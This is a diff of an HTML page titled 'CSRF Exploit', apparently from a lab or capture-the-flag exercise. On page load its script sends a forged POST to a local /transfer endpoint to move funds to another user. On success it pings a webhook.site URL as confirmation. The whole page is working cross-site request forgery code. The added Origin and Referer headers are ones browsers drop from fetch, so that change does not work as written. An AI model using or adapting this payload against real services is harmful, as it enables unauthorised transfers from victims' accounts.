@@ -1,24 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mitchell Zhou</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
     <script>
-        // Trigger the POST request when the page loads
-        fetch("https://127.0.0.1:8080/transfer", {
+        // Send the POST request with the necessary headers
+        fetch("http://127.0.0.1:8080/transfer", {
             method: "POST",
             headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "http://127.0.0.1:8080",
+                "Referer": "http://127.0.0.1:8080/viewtransfer"
             },
-            body: "user_to=s&amount=1000"
+            body: "user_to=s&amount=1"
         })
         .then(response => response.text())
         .then(data => {
-            console.log(data); // Log the response
-            // If the transfer is successful, ping the webhook
+            console.log("Exploit successful:", data);  // log server response
+            // Ping the webhook if successful
             return fetch("https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541", {
-                method: "GET" // Ping the webhook
+                method: "GET"
             });
         })
         .then(() => console.log("Webhook pinged successfully"))
